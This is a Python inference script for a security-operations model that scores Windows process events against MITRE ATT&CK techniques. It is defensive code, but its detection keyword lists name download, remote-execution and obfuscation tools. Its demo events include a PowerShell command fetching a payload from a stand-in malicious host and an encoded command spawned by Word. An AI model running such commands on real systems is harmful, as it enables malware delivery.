"""
SmartSOC Windows-APT Model B v4
Calibrated Inference Pipeline

Purpose:
    - Load the calibrated v4 hybrid model
    - Reproduce the v4 structured feature pipeline
    - Apply the saved OneHotEncoder
    - Apply the saved numerical scaler
    - Apply the saved TF-IDF vectorizer
    - Combine structured + behavioral text features
    - Generate MITRE ATT&CK technique probabilities
    - Apply technique-specific calibrated thresholds
    - Display ranked predictions
    - Perform inference sanity checks

Model:
    Structured categorical features
    + structured numerical features
    + TF-IDF behavioral text
    -> One-vs-Rest Logistic Regression
    -> calibrated technique-specific thresholds
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from typing import Any, Dict, List

import joblib
import numpy as np
import pandas as pd
from scipy.sparse import csr_matrix, hstack


# ============================================================================
# PATHS
# ============================================================================

PROJECT_ROOT = Path(__file__).resolve().parents[1]

MODEL_ROOT = (
    PROJECT_ROOT
    / "models"
    / "windows_apt_v4"
    / "calibrated"
)

MODEL_PATH = (
    MODEL_ROOT
    / "multilabel_logistic_v4_calibrated.joblib"
)

STRUCTURED_ENCODER_PATH = (
    MODEL_ROOT
    / "structured_encoder_v4_calibrated.joblib"
)

NUMERICAL_SCALER_PATH = (
    MODEL_ROOT
    / "numerical_scaler_v4_calibrated.joblib"
)

TFIDF_PATH = (
    MODEL_ROOT
    / "tfidf_vectorizer_v4_calibrated.joblib"
)

LABEL_ENCODER_PATH = (
    MODEL_ROOT
    / "multilabel_encoder_v4_calibrated.joblib"
)

FEATURE_SCHEMA_PATH = (
    MODEL_ROOT
    / "feature_schema_v4_calibrated.json"
)

THRESHOLD_PATH = (
    MODEL_ROOT
    / "technique_thresholds_v4.json"
)


# ============================================================================
# DISPLAY
# ============================================================================

WIDTH = 79


def header(title: str) -> None:
    print()
    print("=" * WIDTH)
    print(title)
    print("=" * WIDTH)


def subheader(title: str) -> None:
    print()
    print("-" * WIDTH)
    print(title)
    print("-" * WIDTH)


# ============================================================================
# FILE VALIDATION
# ============================================================================

def require_file(path: Path) -> None:
    if not path.exists():
        raise FileNotFoundError(
            f"\nRequired file not found:\n{path}\n"
        )

    print(f"[OK] {path}")


def check_artifacts() -> None:
    header("Checking required artifacts...")

    paths = [
        MODEL_PATH,
        STRUCTURED_ENCODER_PATH,
        NUMERICAL_SCALER_PATH,
        TFIDF_PATH,
        LABEL_ENCODER_PATH,
        FEATURE_SCHEMA_PATH,
        THRESHOLD_PATH,
    ]

    for path in paths:
        require_file(path)


# ============================================================================
# LOAD ARTIFACTS
# ============================================================================

def load_artifacts() -> Dict[str, Any]:

    print("\nLoading artifacts...")

    model = joblib.load(MODEL_PATH)
    structured_encoder = joblib.load(STRUCTURED_ENCODER_PATH)
    numerical_scaler = joblib.load(NUMERICAL_SCALER_PATH)
    tfidf = joblib.load(TFIDF_PATH)
    label_encoder = joblib.load(LABEL_ENCODER_PATH)

    with open(
        FEATURE_SCHEMA_PATH,
        "r",
        encoding="utf-8",
    ) as f:
        schema = json.load(f)

    with open(
        THRESHOLD_PATH,
        "r",
        encoding="utf-8",
    ) as f:
        threshold_data = json.load(f)

    print("Model loaded.")
    print("Structured encoder loaded.")
    print("Numerical scaler loaded.")
    print("TF-IDF loaded.")
    print("Label encoder loaded.")
    print("Feature schema loaded.")
    print("Thresholds loaded.")

    return {
        "model": model,
        "structured_encoder": structured_encoder,
        "numerical_scaler": numerical_scaler,
        "tfidf": tfidf,
        "label_encoder": label_encoder,
        "schema": schema,
        "threshold_data": threshold_data,
    }


# ============================================================================
# SCHEMA HELPERS
# ============================================================================

def get_schema_columns(schema: Dict[str, Any]) -> tuple[List[str], List[str]]:

    categorical = schema.get(
        "categorical_columns",
        schema.get("categorical_features", []),
    )

    numerical = schema.get(
        "numerical_columns",
        schema.get("numerical_features", []),
    )

    if not categorical or not numerical:
        raise ValueError(
            "Could not determine categorical/numerical columns "
            "from feature schema."
        )

    return list(categorical), list(numerical)


# ============================================================================
# VALUE NORMALIZATION
# ============================================================================

def clean_string(value: Any) -> str:

    if value is None:
        return ""

    if isinstance(value, float) and np.isnan(value):
        return ""

    value = str(value).strip().lower()

    return value


def clean_number(value: Any, default: float = 0.0) -> float:

    if value is None:
        return default

    try:
        if isinstance(value, str):
            value = value.strip()

            if value == "":
                return default

        result = float(value)

        if not np.isfinite(result):
            return default

        return result

    except Exception:
        return default


# ============================================================================
# EVENT NORMALIZATION
# ============================================================================

def normalize_event(event: Dict[str, Any]) -> Dict[str, Any]:

    e = {}

    for key, value in event.items():
        e[key] = value

    # ------------------------------------------------------------------------
    # Common aliases
    # ------------------------------------------------------------------------

    aliases = {
        "event_id": [
            "event_id",
            "eventID",
            "eventId",
            "_source.data.win.system.eventID",
        ],

        "process_name": [
            "process_name",
            "processName",
            "process",
            "image",
        ],

        "parent_process_name": [
            "parent_process_name",
            "parentProcessName",
            "parent_process",
            "parent_image",
        ],

        "process_extension": [
            "process_extension",
            "processExtension",
        ],

        "parent_extension": [
            "parent_extension",
            "parentExtension",
        ],

        "command_line": [
            "command_line",
            "commandLine",
            "cmdline",
            "command",
        ],

        "parent_command_line": [
            "parent_command_line",
            "parentCommandLine",
        ],

        "user": [
            "user",
            "username",
            "user_name",
        ],
    }

    normalized = {}

    for canonical, candidates in aliases.items():

        value = None

        for candidate in candidates:

            if candidate in e:
                value = e[candidate]
                break

        normalized[canonical] = value

    # Preserve every original field.
    normalized.update(e)

    # ------------------------------------------------------------------------
    # Process names
    # ------------------------------------------------------------------------

    normalized["process_name"] = clean_string(
        normalized.get("process_name")
    )

    normalized["parent_process_name"] = clean_string(
        normalized.get("parent_process_name")
    )

    # ------------------------------------------------------------------------
    # Automatically derive extensions
    # ------------------------------------------------------------------------

    if not normalized.get("process_extension"):

        process = normalized["process_name"]

        if "." in process:
            normalized["process_extension"] = (
                process.rsplit(".", 1)[-1]
            )

    if not normalized.get("parent_extension"):

        parent = normalized["parent_process_name"]

        if "." in parent:
            normalized["parent_extension"] = (
                parent.rsplit(".", 1)[-1]
            )

    normalized["process_extension"] = clean_string(
        normalized.get("process_extension")
    )

    normalized["parent_extension"] = clean_string(
        normalized.get("parent_extension")
    )

    # ------------------------------------------------------------------------
    # Numeric event ID
    # ------------------------------------------------------------------------

    normalized["event_id"] = clean_number(
        normalized.get("event_id")
    )

    return normalized


# ============================================================================
# BEHAVIOR SIGNAL EXTRACTION
# ============================================================================

def contains_any(text: str, values: List[str]) -> int:

    text = clean_string(text)

    for value in values:

        if value.lower() in text:
            return 1

    return 0


def get_full_command(event: Dict[str, Any]) -> str:

    parts = [
        event.get("command_line", ""),
        event.get("parent_command_line", ""),
    ]

    return " ".join(
        clean_string(x)
        for x in parts
        if clean_string(x)
    )


def derive_boolean_features(event: Dict[str, Any]) -> Dict[str, int]:

    command = get_full_command(event)

    process = clean_string(
        event.get("process_name")
    )

    parent = clean_string(
        event.get("parent_process_name")
    )

    user = clean_string(
        event.get("user")
    )

    result: Dict[str, int] = {}

    # ------------------------------------------------------------------------
    # Process/image presence
    # ------------------------------------------------------------------------

    result["has_process_image"] = int(bool(process))
    result["has_parent_image"] = int(bool(parent))

    result["has_user"] = int(bool(user))
    result["has_parent_user"] = int(bool(
        event.get("parent_user")
    ))

    # ------------------------------------------------------------------------
    # User context
    # ------------------------------------------------------------------------

    result["is_system_user"] = int(
        user in {
            "system",
            "nt authority\\system",
            "local system",
        }
    )

    result["is_admin_user"] = int(
        user in {
            "administrator",
            "admin",
            "domain administrator",
            "domain\\administrator",
        }
        or "administrator" in user
        or user.endswith("\\admin")
    )

    # ------------------------------------------------------------------------
    # Integrity
    # ------------------------------------------------------------------------

    integrity = clean_string(
        event.get("integrity")
    )

    result["integrity_high"] = int(
        "high" in integrity
    )

    result["integrity_medium"] = int(
        "medium" in integrity
    )

    # ------------------------------------------------------------------------
    # Command line
    # ------------------------------------------------------------------------

    cmd = clean_string(
        event.get("command_line")
    )

    parent_cmd = clean_string(
        event.get("parent_command_line")
    )

    result["command_length"] = len(cmd)
    result["parent_command_length"] = len(parent_cmd)

    result["has_command_line"] = int(bool(cmd))
    result["has_parent_command"] = int(bool(parent_cmd))

    # ------------------------------------------------------------------------
    # Execution utilities
    # ------------------------------------------------------------------------

    result["uses_powershell"] = contains_any(
        command,
        ["powershell", "pwsh"],
    )

    result["uses_cmd"] = contains_any(
        command,
        ["cmd.exe", " cmd "],
    )

    result["uses_net"] = contains_any(
        command,
        ["net.exe", "net user", "net group"],
    )

    result["uses_whoami"] = contains_any(
        command,
        ["whoami"],
    )

    result["uses_schtasks"] = contains_any(
        command,
        ["schtasks"],
    )

    result["uses_reg"] = contains_any(
        command,
        ["reg.exe", "reg add", "reg query"],
    )

    result["uses_rundll32"] = contains_any(
        command,
        ["rundll32"],
    )

    result["uses_wmic"] = contains_any(
        command,
        ["wmic"],
    )

    result["uses_certutil"] = contains_any(
        command,
        ["certutil"],
    )

    result["uses_bitsadmin"] = contains_any(
        command,
        ["bitsadmin"],
    )

    result["uses_ipconfig"] = contains_any(
        command,
        ["ipconfig"],
    )

    result["uses_netstat"] = contains_any(
        command,
        ["netstat"],
    )

    result["uses_tasklist"] = contains_any(
        command,
        ["tasklist"],
    )

    result["uses_sc"] = contains_any(
        command,
        ["sc.exe", "sc query", "sc create"],
    )

    result["uses_mshta"] = contains_any(
        command,
        ["mshta"],
    )

    result["uses_regsvr32"] = contains_any(
        command,
        ["regsvr32"],
    )

    result["uses_cscript"] = contains_any(
        command,
        ["cscript"],
    )

    result["uses_wscript"] = contains_any(
        command,
        ["wscript"],
    )

    result["uses_wevtutil"] = contains_any(
        command,
        ["wevtutil"],
    )

    result["uses_vssadmin"] = contains_any(
        command,
        ["vssadmin"],
    )

    # ------------------------------------------------------------------------
    # Suspicious command behavior
    # ------------------------------------------------------------------------

    result["has_encoded_command"] = int(
        "-encodedcommand" in command
        or "-enc " in command
        or "frombase64string" in command
    )

    result["has_download_behavior"] = int(
        any(
            x in command
            for x in [
                "invoke-webrequest",
                "invoke-restmethod",
                "downloadstring",
                "downloadfile",
                "bitsadmin",
                "certutil",
                "curl ",
                "wget ",
                "http://",
                "https://",
            ]
        )
    )

    result["has_remote_execution_hint"] = int(
        any(
            x in command
            for x in [
                "psexec",
                "winrm",
                "invoke-command",
                "enter-pssession",
                "wmic /node",
                "\\\\",
            ]
        )
    )

    result["has_registry_operation"] = int(
        any(
            x in command
            for x in [
                "reg add",
                "reg delete",
                "reg query",
                "registry",
                "hkey_",
            ]
        )
    )

    result["has_file_deletion"] = int(
        any(
            x in command
            for x in [
                "del ",
                "erase ",
                "remove-item",
                "rmdir",
                "rd ",
                "cipher /w",
            ]
        )
    )

    result["has_obfuscation_hint"] = int(
        any(
            x in command
            for x in [
                "-encodedcommand",
                "-enc ",
                "frombase64string",
                "iex",
                "invoke-expression",
                "char(",
                "[char]",
                "^",
            ]
        )
    )

    # ------------------------------------------------------------------------
    # Process relationship
    # ------------------------------------------------------------------------

    result["same_process_parent"] = int(
        bool(process)
        and bool(parent)
        and process == parent
    )

    result["suspicious_parent_wazuh"] = int(
        "wazuh" in parent
    )

    # ------------------------------------------------------------------------
    # Hashes
    # ------------------------------------------------------------------------

    sha256 = clean_string(
        event.get("sha256")
    )

    md5 = clean_string(
        event.get("md5")
    )

    result["has_sha256"] = int(bool(sha256))
    result["has_md5"] = int(bool(md5))
    result["has_hash"] = int(
        bool(sha256) or bool(md5)
    )

    # ------------------------------------------------------------------------
    # Network indicators
    # ------------------------------------------------------------------------

    source_ip = clean_string(
        event.get("source_ip")
    )

    destination_ip = clean_string(
        event.get("destination_ip")
    )

    source_port = event.get("source_port")
    destination_port = event.get("destination_port")
    protocol = clean_string(
        event.get("protocol")
    )

    result["has_source_ip"] = int(bool(source_ip))
    result["has_destination_ip"] = int(bool(destination_ip))

    result["has_source_port"] = int(
        clean_number(source_port) > 0
    )

    result["has_destination_port"] = int(
        clean_number(destination_port) > 0
    )

    result["has_protocol"] = int(
        bool(protocol)
    )

    result["is_network_event"] = int(
        result["has_source_ip"]
        or result["has_destination_ip"]
        or result["has_source_port"]
        or result["has_destination_port"]
    )

    # ------------------------------------------------------------------------
    # Target indicators
    # ------------------------------------------------------------------------

    target_filename = clean_string(
        event.get("target_filename")
    )

    image_loaded = clean_string(
        event.get("image_loaded")
    )

    target_object = clean_string(
        event.get("target_object")
    )

    result["has_target_filename"] = int(
        bool(target_filename)
    )

    result["has_image_loaded"] = int(
        bool(image_loaded)
    )

    result["has_target_object"] = int(
        bool(target_object)
    )

    return result


# ============================================================================
# STRUCTURED FEATURE CONSTRUCTION
# ============================================================================

def build_structured_row(
    event: Dict[str, Any],
    categorical_columns: List[str],
    numerical_columns: List[str],
) -> tuple[pd.DataFrame, pd.DataFrame]:

    event = normalize_event(event)

    derived = derive_boolean_features(event)

    # Combine raw event + derived features.
    values: Dict[str, Any] = {}

    values.update(event)
    values.update(derived)

    # ------------------------------------------------------------------------
    # Categorical frame
    # ------------------------------------------------------------------------

    categorical_data = {}

    for column in categorical_columns:

        value = values.get(column, "")

        categorical_data[column] = [
            clean_string(value)
        ]

    categorical_df = pd.DataFrame(
        categorical_data,
        columns=categorical_columns,
    )

    # ------------------------------------------------------------------------
    # Numerical frame
    # ------------------------------------------------------------------------

    numerical_data = {}

    for column in numerical_columns:

        value = values.get(column, 0)

        numerical_data[column] = [
            clean_number(value)
        ]

    numerical_df = pd.DataFrame(
        numerical_data,
        columns=numerical_columns,
    )

    return categorical_df, numerical_df


# ============================================================================
# BEHAVIOR TEXT
# ============================================================================

def build_behavior_text(event: Dict[str, Any]) -> str:

    event = normalize_event(event)

    derived = derive_boolean_features(event)

    pieces: List[str] = []

    # Core fields
    event_id = event.get("event_id")

    if event_id is not None:
        pieces.append(
            f"event_id={event_id}"
        )

    process = clean_string(
        event.get("process_name")
    )

    parent = clean_string(
        event.get("parent_process_name")
    )

    command = clean_string(
        event.get("command_line")
    )

    parent_command = clean_string(
        event.get("parent_command_line")
    )

    user = clean_string(
        event.get("user")
    )

    if process:
        pieces.append(
            f"process_name={process}"
        )

    if parent:
        pieces.append(
            f"parent_process_name={parent}"
        )

    if command:
        pieces.append(
            f"command_line={command}"
        )

    if parent_command:
        pieces.append(
            f"parent_command_line={parent_command}"
        )

    if user:
        pieces.append(
            f"user={user}"
        )

    # Add behavioral indicators exactly as tokenized features.
    boolean_features = [
        "uses_powershell",
        "uses_cmd",
        "uses_net",
        "uses_whoami",
        "uses_schtasks",
        "uses_reg",
        "uses_rundll32",
        "uses_wmic",
        "uses_certutil",
        "uses_bitsadmin",
        "uses_ipconfig",
        "uses_netstat",
        "uses_tasklist",
        "uses_sc",
        "uses_mshta",
        "uses_regsvr32",
        "uses_cscript",
        "uses_wscript",
        "uses_wevtutil",
        "uses_vssadmin",
        "has_encoded_command",
        "has_download_behavior",
        "has_remote_execution_hint",
        "has_registry_operation",
        "has_file_deletion",
        "has_obfuscation_hint",
        "has_hash",
        "has_sha256",
        "has_md5",
        "has_source_ip",
        "has_destination_ip",
        "has_source_port",
        "has_destination_port",
        "has_protocol",
        "is_network_event",
        "has_target_filename",
        "has_image_loaded",
        "has_target_object",
    ]

    for feature in boolean_features:

        if derived.get(feature, 0):
            pieces.append(
                f"{feature}=1"
            )

    return " ".join(pieces)


# ============================================================================
# THRESHOLD HANDLING
# ============================================================================

def load_thresholds(
    threshold_data: Dict[str, Any],
    techniques: List[str],
) -> tuple[Dict[str, float], float]:

    default_threshold = clean_number(
        threshold_data.get(
            "default_threshold",
            0.5,
        ),
        default=0.5,
    )

    # ---------------------------------------------------------------
    # IMPORTANT:
    #
    # The JSON has:
    #
    # {
    #     "default_threshold": 0.5,
    #     "techniques": [...],
    #     "thresholds": {
    #         "T1105": 0.25,
    #         ...
    #     }
    # }
    #
    # We MUST read threshold_data["thresholds"].
    # Do NOT iterate through the top-level dictionary.
    # ---------------------------------------------------------------

    raw_thresholds = threshold_data.get(
        "thresholds",
        {},
    )

    if not isinstance(raw_thresholds, dict):
        raise ValueError(
            "Invalid threshold file: 'thresholds' "
            "must be a dictionary."
        )

    thresholds: Dict[str, float] = {}

    for technique in techniques:

        value = raw_thresholds.get(
            technique,
            default_threshold,
        )

        value = clean_number(
            value,
            default=default_threshold,
        )

        # Keep threshold inside valid probability range.
        value = max(
            0.0,
            min(1.0, value),
        )

        thresholds[technique] = value

    return thresholds, default_threshold


# ============================================================================
# MODEL PREDICTION
# ============================================================================

def predict_event(
    event: Dict[str, Any],
    artifacts: Dict[str, Any],
) -> Dict[str, Any]:

    model = artifacts["model"]
    structured_encoder = artifacts["structured_encoder"]
    numerical_scaler = artifacts["numerical_scaler"]
    tfidf = artifacts["tfidf"]
    label_encoder = artifacts["label_encoder"]
    schema = artifacts["schema"]
    threshold_data = artifacts["threshold_data"]

    categorical_columns, numerical_columns = (
        get_schema_columns(schema)
    )

    # ------------------------------------------------------------------------
    # Build structured features
    # ------------------------------------------------------------------------

    categorical_df, numerical_df = build_structured_row(
        event,
        categorical_columns,
        numerical_columns,
    )

    # ------------------------------------------------------------------------
    # One-hot encode categorical features
    # ------------------------------------------------------------------------

    categorical_matrix = structured_encoder.transform(
        categorical_df
    )

    categorical_matrix = csr_matrix(
        categorical_matrix
    )

    # ------------------------------------------------------------------------
    # Scale numerical features
    # ------------------------------------------------------------------------

    numerical_matrix = numerical_scaler.transform(
        numerical_df
    )

    numerical_matrix = csr_matrix(
        numerical_matrix
    )

    # ------------------------------------------------------------------------
    # Structured matrix
    # ------------------------------------------------------------------------

    structured_matrix = hstack(
        [
            categorical_matrix,
            numerical_matrix,
        ],
        format="csr",
    )

    # ------------------------------------------------------------------------
    # Behavior text
    # ------------------------------------------------------------------------

    behavior_text = build_behavior_text(event)

    text_matrix = tfidf.transform(
        [behavior_text]
    )

    text_matrix = csr_matrix(
        text_matrix
    )

    # ------------------------------------------------------------------------
    # Hybrid matrix
    # ------------------------------------------------------------------------

    hybrid_matrix = hstack(
        [
            structured_matrix,
            text_matrix,
        ],
        format="csr",
    )

    expected_features = schema.get(
        "final_feature_count"
    )

    if expected_features is None:
        expected_features = (
            structured_matrix.shape[1]
            + text_matrix.shape[1]
        )

    actual_features = hybrid_matrix.shape[1]

    print(
        f"\nGenerated hybrid feature count: "
        f"{actual_features}"
    )

    if actual_features != expected_features:

        raise ValueError(
            "\nFEATURE COUNT MISMATCH\n"
            f"Expected: {expected_features}\n"
            f"Generated: {actual_features}\n\n"
            "The inference feature construction does not "
            "match the v4 training pipeline."
        )

    # ------------------------------------------------------------------------
    # Probability prediction
    # ------------------------------------------------------------------------

    probabilities = model.predict_proba(
        hybrid_matrix
    )

    # OneVsRest can return ndarray or special shape depending on sklearn.
    probabilities = np.asarray(
        probabilities
    )

    if probabilities.ndim == 1:
        probabilities = probabilities.reshape(
            1, -1
        )

    probability_row = probabilities[0]

    # ------------------------------------------------------------------------
    # MITRE techniques
    # ------------------------------------------------------------------------

    techniques = list(
        label_encoder.classes_
    )

    if len(techniques) != len(
        probability_row
    ):
        raise ValueError(
            "Number of MITRE classes does not match "
            "probability output."
        )

    # ------------------------------------------------------------------------
    # Calibrated thresholds
    # ------------------------------------------------------------------------

    thresholds, default_threshold = load_thresholds(
        threshold_data,
        techniques,
    )

    # ------------------------------------------------------------------------
    # Apply thresholds
    # ------------------------------------------------------------------------

    predictions = []

    for technique, probability in zip(
        techniques,
        probability_row,
    ):

        probability = float(
            probability
        )

        threshold = thresholds.get(
            technique,
            default_threshold,
        )

        if probability >= threshold:

            predictions.append(
                {
                    "technique": technique,
                    "confidence": probability,
                    "threshold": threshold,
                }
            )

    # ------------------------------------------------------------------------
    # Sort by confidence
    # ------------------------------------------------------------------------

    predictions.sort(
        key=lambda x: x["confidence"],
        reverse=True,
    )

    # ------------------------------------------------------------------------
    # Fallback
    #
    # If no technique crosses its threshold, keep the highest-confidence
    # technique ONLY if its confidence is reasonably meaningful.
    # ------------------------------------------------------------------------

    fallback_used = False

    if not predictions:

        best_index = int(
            np.argmax(probability_row)
        )

        best_technique = techniques[
            best_index
        ]

        best_probability = float(
            probability_row[best_index]
        )

        best_threshold = thresholds.get(
            best_technique,
            default_threshold,
        )

        # Do not force arbitrary predictions.
        # A low-confidence event remains "no confident technique".
        if best_probability >= 0.25:

            predictions.append(
                {
                    "technique": best_technique,
                    "confidence": best_probability,
                    "threshold": best_threshold,
                }
            )

            fallback_used = True

    return {
        "behavior_text": behavior_text,
        "predictions": predictions,
        "probabilities": probability_row,
        "techniques": techniques,
        "thresholds": thresholds,
        "fallback_used": fallback_used,
        "feature_count": actual_features,
    }


# ============================================================================
# THRESHOLD AUDIT
# ============================================================================

def print_threshold_audit(
    artifacts: Dict[str, Any]
) -> None:

    header(
        "SmartSOC Windows-APT Model B v4 "
        "- Calibrated Threshold Audit"
    )

    label_encoder = artifacts["label_encoder"]
    threshold_data = artifacts["threshold_data"]

    techniques = list(
        label_encoder.classes_
    )

    thresholds, default_threshold = (
        load_thresholds(
            threshold_data,
            techniques,
        )
    )

    values = list(
        thresholds.values()
    )

    print(
        f"\nTechnique count : {len(thresholds)}"
    )

    print(
        f"Default threshold: "
        f"{default_threshold:.4f}"
    )

    print(
        f"Minimum threshold: "
        f"{min(values):.4f}"
    )

    print(
        f"Maximum threshold: "
        f"{max(values):.4f}"
    )

    print(
        "Unique thresholds:",
        sorted(
            set(
                round(x, 4)
                for x in values
            )
        ),
    )

    subheader(
        "Technique-specific thresholds"
    )

    for technique in techniques:

        threshold_value = thresholds.get(
            technique,
            default_threshold,
        )

        print(
            f"{technique:<12} "
            f"{threshold_value:.4f}"
        )


# ============================================================================
# MODEL INFORMATION
# ============================================================================

def print_model_information(
    artifacts: Dict[str, Any]
) -> None:

    model = artifacts["model"]
    tfidf = artifacts["tfidf"]
    label_encoder = artifacts["label_encoder"]
    schema = artifacts["schema"]

    categorical, numerical = (
        get_schema_columns(schema)
    )

    expected_features = schema.get(
        "final_feature_count",
        "unknown",
    )

    header(
        "SmartSOC Windows-APT Model B v4"
    )

    print(
        f"\nModel type        : "
        f"{type(model).__name__}"
    )

    print(
        f"MITRE techniques  : "
        f"{len(label_encoder.classes_)}"
    )

    print(
        f"TF-IDF vocabulary : "
        f"{len(tfidf.vocabulary_)}"
    )

    print(
        f"Expected features : "
        f"{expected_features}"
    )

    print(
        "\nCategorical features:"
    )

    for column in categorical:
        print(
            f"- {column}"
        )

    print(
        f"\nNumerical feature count: "
        f"{len(numerical)}"
    )


# ============================================================================
# DEMO EVENTS
# ============================================================================

DEMO_EVENTS = [

    {
        "event_id": 1,
        "process_name": "powershell.exe",
        "parent_process_name": "explorer.exe",
        "command_line": (
            "powershell.exe Get-Service"
        ),
        "parent_command_line": (
            "explorer.exe"
        ),
        "user": "administrator",
        "uses_powershell": 1,
    },

    {
        "event_id": 1,
        "process_name": "powershell.exe",
        "parent_process_name": "winword.exe",
        "command_line": (
            "powershell.exe -EncodedCommand "
            "SQBFAFgA"
        ),
        "parent_command_line": (
            "winword.exe suspicious.docm"
        ),
        "user": "administrator",
        "uses_powershell": 1,
        "has_encoded_command": 1,
        "has_obfuscation_hint": 1,
    },

    {
        "event_id": 1,
        "process_name": "powershell.exe",
        "parent_process_name": "cmd.exe",
        "command_line": (
            "powershell.exe Invoke-WebRequest "
            "https://malicious.example/payload.exe "
            "-OutFile C:\\Temp\\payload.exe"
        ),
        "parent_command_line": "cmd.exe",
        "user": "administrator",
        "uses_powershell": 1,
        "uses_cmd": 1,
        "has_download_behavior": 1,
        "has_remote_execution_hint": 1,
    },

    {
        "event_id": 11,
        "process_name": "unknown.exe",
        "parent_process_name": "cmd.exe",
        "command_line": (
            "unknown.exe mass file modification "
            "and destruction"
        ),
        "parent_command_line": "cmd.exe",
        "user": "administrator",
        "has_file_deletion": 1,
        "has_obfuscation_hint": 1,
    },
]


# ============================================================================
# PRINT PREDICTIONS
# ============================================================================

def print_prediction_result(
    event_number: int,
    event: Dict[str, Any],
    result: Dict[str, Any],
) -> None:

    header(
        f"DEMO EVENT {event_number}"
    )

    print(
        "\nBehavior text:"
    )

    print(
        result["behavior_text"]
    )

    print(
        "\nPredicted MITRE techniques:"
    )

    predictions = result["predictions"]

    if not predictions:

        print(
            "NONE — no technique exceeded "
            "its calibrated threshold."
        )

    else:

        for prediction in predictions:

            technique = prediction[
                "technique"
            ]

            confidence = prediction[
                "confidence"
            ]

            threshold = prediction[
                "threshold"
            ]

            print(
                f"{technique:<12} | "
                f"confidence={confidence:.4f} | "
                f"threshold={threshold:.4f}"
            )

    if result["fallback_used"]:

        print(
            "\n[WARNING] Fallback prediction used."
        )

    # ------------------------------------------------------------------------
    # Top probabilities
    # ------------------------------------------------------------------------

    techniques = result["techniques"]
    probabilities = result["probabilities"]

    ranked = sorted(
        zip(
            techniques,
            probabilities,
        ),
        key=lambda x: x[1],
        reverse=True,
    )

    print(
        "\nTop probability scores:"
    )

    for technique, probability in ranked[:10]:

        threshold = result[
            "thresholds"
        ].get(
            technique,
            0.5,
        )

        print(
            f"{technique:<12} "
            f"{probability:.4f} "
            f"(threshold={threshold:.4f})"
        )


# ============================================================================
# SANITY CHECKS
# ============================================================================

def sanity_check(
    artifacts: Dict[str, Any],
) -> None:

    header(
        "Inference Artifact Sanity Check"
    )

    model = artifacts["model"]
    encoder = artifacts["structured_encoder"]
    scaler = artifacts["numerical_scaler"]
    tfidf = artifacts["tfidf"]
    label_encoder = artifacts["label_encoder"]
    schema = artifacts["schema"]

    categorical, numerical = (
        get_schema_columns(schema)
    )

    expected_features = schema.get(
        "final_feature_count"
    )

    encoder_features = getattr(
        encoder,
        "n_features_in_",
        len(categorical),
    )

    scaler_features = getattr(
        scaler,
        "n_features_in_",
        len(numerical),
    )

    tfidf_features = len(
        tfidf.vocabulary_
    )

    encoded_output = getattr(
        encoder,
        "categories_",
        [],
    )

    one_hot_count = sum(
        len(x)
        for x in encoded_output
    )

    calculated = (
        one_hot_count
        + scaler_features
        + tfidf_features
    )

    print(
        f"Categorical input features : "
        f"{encoder_features}"
    )

    print(
        f"Categorical encoded features: "
        f"{one_hot_count}"
    )

    print(
        f"Numerical features          : "
        f"{scaler_features}"
    )

    print(
        f"TF-IDF features              : "
        f"{tfidf_features}"
    )

    print(
        f"Calculated hybrid features  : "
        f"{calculated}"
    )

    print(
        f"Schema expected features    : "
        f"{expected_features}"
    )

    print(
        f"Model input features        : "
        f"{getattr(model, 'n_features_in_', 'unknown')}"
    )

    print(
        f"MITRE classes               : "
        f"{len(label_encoder.classes_)}"
    )

    if (
        expected_features is not None
        and calculated != expected_features
    ):

        raise ValueError(
            "\nArtifact mismatch detected.\n"
            f"Calculated: {calculated}\n"
            f"Expected: {expected_features}\n"
        )

    model_features = getattr(
        model,
        "n_features_in_",
        None,
    )

    if (
        model_features is not None
        and model_features != calculated
    ):

        raise ValueError(
            "\nModel/artifact mismatch.\n"
            f"Model expects: {model_features}\n"
            f"Pipeline creates: {calculated}\n"
        )

    print(
        "\n[OK] Artifact dimensions are consistent."
    )


# ============================================================================
# MAIN
# ============================================================================

def main() -> None:

    try:

        check_artifacts()

        artifacts = load_artifacts()

        print_model_information(
            artifacts
        )

        sanity_check(
            artifacts
        )

        print_threshold_audit(
            artifacts
        )

        # ---------------------------------------------------------------
        # Run demo events
        # ---------------------------------------------------------------

        for index, event in enumerate(
            DEMO_EVENTS,
            start=1,
        ):

            result = predict_event(
                event,
                artifacts,
            )

            print_prediction_result(
                index,
                event,
                result,
            )

        header(
            "SmartSOC Windows-APT "
            "Model B v4 Inference Test Complete"
        )

    except KeyboardInterrupt:

        print(
            "\nInference interrupted."
        )

        sys.exit(1)

    except Exception as exc:

        print(
            "\nINFERENCE ERROR:"
        )

        print(
            str(exc)
        )

        print(
            "\nThis indicates that the inference "
            "pipeline or model artifacts are inconsistent."
        )

        raise


if __name__ == "__main__":
    main()